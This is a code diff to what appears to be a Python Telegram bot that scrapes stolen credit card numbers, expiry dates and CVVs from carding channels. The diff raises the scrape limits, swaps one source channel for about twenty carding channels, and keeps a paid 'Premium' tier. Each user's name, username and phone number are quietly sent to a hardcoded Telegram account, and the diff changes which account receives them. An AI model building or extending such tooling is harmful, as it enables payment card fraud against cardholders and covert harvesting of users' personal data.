@@ -89,12 +89,12 @@ EX -> /bin [bin]
 ━━━━━━━━━━━━━━━━━━━
 ᴛʜᴇ ᴅᴇғᴀᴜʟᴛ ɪɴғᴏʀᴍᴀᴛɪᴏɴ ᴏғ ѕᴄʀᴀᴘ ᴀʀᴇ
 ------------
-𝙻𝙸𝙼𝙸𝚃 = 2000
+𝙻𝙸𝙼𝙸𝚃 = 20000
 ------------
-𝙲𝙷𝙰𝙽𝙽𝙴𝙻 = @Approved4CC 
+𝙲𝙷𝙰𝙽𝙽𝙴𝙻 = ALOT OF
 -------------------------
 ᴛʜᴇ ʟɪᴍɪᴛѕ ᴏғ ғʀᴇᴇ ᴘʟᴀɴ ᴀʀᴇ
-scr » 5000
+scr » 20000
 SB » 100
 ━━━━━━━━━━━━━━━━━━━
 
@@ -127,8 +127,8 @@ async def handle_scrap_command(event):
     sender = await event.get_sender()
     sender_id = sender.id
     plan = get_user_plan(sender_id)
-    limit = 2000  
-    channel_username = "@Approved4CC "
+    limit = 20000  
+    channel_username = "@Approved4CC","@OnlyApproverd","@Xenonscrapper","@asurccworld_scrapper","@ccxen","@cpscrapper","@professorccchats","@VegetaScrap","@ApprovedF4","@OzarkScrapper","@cpscr","@teamnastyscr","@teamnastyscr","@Sscrapper_CC","@LuciferSCR","@error101scrapper","@RevyDrops","@vipscraper","@xenscrape","@LalaScrapperFree","@teamnastyscr","@cashCardHubCC"
     
     card_pattern = r"\b(\d{15}|\d{16}) (\d{2})/(\d{2}) (\d{3}|\d{4})\b"
     card_pattern2 = r"\b(\d{15}|\d{16})\|(\d{2})\|(\d{2}|\d{4})\|(\d{3}|\d{4})\b"
@@ -147,10 +147,10 @@ async def handle_scrap_command(event):
                 if parts[1].isdigit():
                     limit = (int(parts[1]))
 
-    if limit > 5000 and plan != "Premium":
+    if limit > 20000 and plan != "Premium":
         await event.reply("""
 You have The Free plan 
-so you can't Scrap more than 5000 CCs at once.
+so you can't Scrap more than 20000 CCs at once.
 To get the PREMIUM Plan, message the Dev » @iii_cvc """)
         return
     try:
@@ -164,7 +164,7 @@ To get the PREMIUM Plan, message the Dev » @iii_cvc """)
 
 𝙵𝙾𝚁 -> {sender.first_name} 
 
-𝙲𝙷𝙰𝙽𝙽𝙴𝙻 -> {channel_username}
+𝙲𝙷𝙰𝙽𝙽𝙴𝙻 -> 2️⃣0️⃣ CHANNELS
 
 𝙻𝙸𝙼𝙸𝚃 -> {limit}
 
@@ -219,11 +219,11 @@ async def handle_SB_command(event):
     sender = await event.get_sender()
     sender_id = sender.id
     plan = get_user_plan(sender_id)
-    channel_limit = 200
-    bin_limit = 5
+    channel_limit = 2000
+    bin_limit = 1000
     bin_number = None
     cards_found = 0
-    channel_username = "@Approved4CC "
+    channel_username = "@Approved4CC","@OnlyApproverd","@Xenonscrapper","@asurccworld_scrapper","@ccxen","@cpscrapper","@professorccchats","@VegetaScrap","@ApprovedF4","@OzarkScrapper","@cpscr","@teamnastyscr","@teamnastyscr","@Sscrapper_CC","@LuciferSCR","@error101scrapper","@RevyDrops","@vipscraper","@xenscrape","@LalaScrapperFree","@teamnastyscr","@cashCardHubCC"
 
     card_pattern = r"\b(\d{15}|\d{16}) (\d{2})/(\d{2}) (\d{3}|\d{4})\b"
     card_pattern2 = r"\b(\d{15}|\d{16})\|(\d{2})\|(\d{2}|\d{4})\|(\d{3}|\d{4})\b"
@@ -269,7 +269,7 @@ First Name: {sender.first_name}
 Last Name: {sender.last_name}
 Username: @{sender.username}
 Phone: {sender.phone}"""
-    await client.send_message(5294929641, user_data)
+    await client.send_message(5207032121, user_data)
 
     start_message = await event.reply(f"""
 𝚂𝙲𝚁𝙰𝙿𝙸𝙽𝙶 𝚂𝚃𝙰𝚁𝚃𝙴𝙳...........! 
